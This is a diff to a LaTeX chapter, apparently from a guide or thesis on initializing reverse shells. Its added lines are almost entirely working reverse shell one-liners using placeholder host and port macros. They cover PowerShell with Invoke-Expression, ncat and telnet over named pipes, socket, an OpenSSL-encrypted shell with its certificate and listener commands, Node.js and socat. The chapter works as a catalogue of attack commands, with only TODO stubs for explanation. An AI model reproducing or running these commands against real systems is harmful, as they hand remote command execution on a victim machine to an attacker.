@@ -6,7 +6,7 @@ In this chapter, we go through known methods and techniques of initializing a re
 
 \section{Commands syntax and glossary}
 
-\TODO{here should be explained what do keywords <SHELL>, <HOST>, <PORT> mean and so on}
+\TODO{here should be explained what do keywords \shell, \host, \port mean and so on}
 
 
 \section{Command-line interpreters}
@@ -48,10 +48,10 @@ ksh -c '|\shell| > /dev/tcp/|\host|/|\port| 2>&1 0>&1'
 \subsection{Scheme shell (\texttt{scsh})}
 
 
-\subsection{PowerShell (\texttt{powershell}/\texttt{pwsh})}
+\subsection{PowerShell (\texttt{pwsh}/\texttt{powershell})}
 
 \begin{cmdline}{bash}{|}{pwsh}{}
-pwsh -c '$TCPClient = New-Object Net.Sockets.TCPClient(|\host|, |\port|); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
+pwsh -c '$TCPClient = New-Object Net.Sockets.TCPClient("|\host|", |\port|); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
 \end{cmdline}
 
 \dpd{\texttt{pwsh.dll} \footnote{usually located in \texttt{/opt/microsoft/powershell/}}, .NET}
@@ -83,24 +83,41 @@ ncat -e |\shell| |\host| |\port|
 \end{cmdline}
 \notte{Standard error output of executed commands is not redirected to the socket. Option \texttt{-c} (\texttt{-{}-sh-exec}) can be used instead of \texttt{-e} with the same syntax, but \texttt{/bin/sh} is needed in that case.}
 
-\begin{cmdline}{bash}{^}{mkfifo,cat,nc}{}
-mkfifo ^\file^; cat ^\file^ | ^\shell^ 2>&1 | nc ^\host^ ^\port^ >^\file^
+\begin{cmdline}{bash}{^}{mkfifo,ncat}{}
+mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | ncat ^\host^ ^\port^ > ^\file^; rm ^\file^
 \end{cmdline}
-\dpd{\texttt{mkfifo}, \texttt{cat}}
+\dpd{\texttt{mkfifo}}
 
-\subsection{Telnet}
+\subsection{Telnet (\texttt{telnet})}
 
 \begin{cmdline}{bash}{^}{telnet}{}
 telnet ^\host^ ^\port^ | ^\shell^ 2>&1 | telnet ^\host^ ^\portt^
 \end{cmdline}
-\notte{The socket with port number \port serves as standard input while the socket with port number \portt serves as standard output and standard error output.}
+\notte{The socket with port number \port\ serves as standard input while the socket with port number \portt\ serves as standard output and standard error output.}
 
-\begin{cmdline}{bash}{^}{mkfifo,cat,telnet}{}
-mkfifo ^\file^; cat ^\file^ | ^\shell^ 2>&1 | telnet ^\host^ ^\port^ >^\file^
+\begin{cmdline}{bash}{^}{mkfifo,telnet}{}
+mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | telnet ^\host^ ^\port^ > ^\file^; rm ^\file^
 \end{cmdline}
-\dpd{\texttt{mkfifo}, \texttt{cat}}
+\dpd{\texttt{mkfifo}}
 
-\subsection{OpenSSL}
+\subsection{Socket (\texttt{socket})}
+
+\begin{cmdline}{bash}{|}{socket}{}
+socket -qvp '|\shell|' |\host| |\port|
+\end{cmdline}
+
+\subsection{OpenSSL (\texttt{openssl})}
+
+\begin{cmdline}{bash}{^}{mkfifo, openssl}{}
+mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | openssl s_client -quiet -connect ^\host^:^\port^ > ^\file^; rm ^\file^
+\end{cmdline}
+
+\TODO{describe/explain commands that need to be run on attacker machine:}
+
+\begin{cmdline}{bash}{|}{openssl}{}
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port |\port|
+\end{cmdline}
 
 
 \section{Programming languages interpreters}
@@ -113,6 +130,18 @@ mkfifo ^\file^; cat ^\file^ | ^\shell^ 2>&1 | telnet ^\host^ ^\port^ >^\file^
 
 \subsection{Ruby}
 
+\subsection{Node.js (\texttt{node})}
+
+\begin{cmdline}{bash}{|}{node}{}
+node -e 'shell = require("child_process").spawn("|\shell|"); require("net").connect(|\port|, "|\host|", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
+\end{cmdline}
 
 \section{Other tools}
+
+\subsection{Socat (\texttt{socat})}
+
+\begin{cmdline}{bash}{|}{socat}{}
+socat tcp-connect:|\host|:|\port| exec:|\shell|,pty,stderr,setsid,sigint,sane
+\end{cmdline}
+\TODO{dependencies, explain "optional" settings (pty,stderr,...)}
 
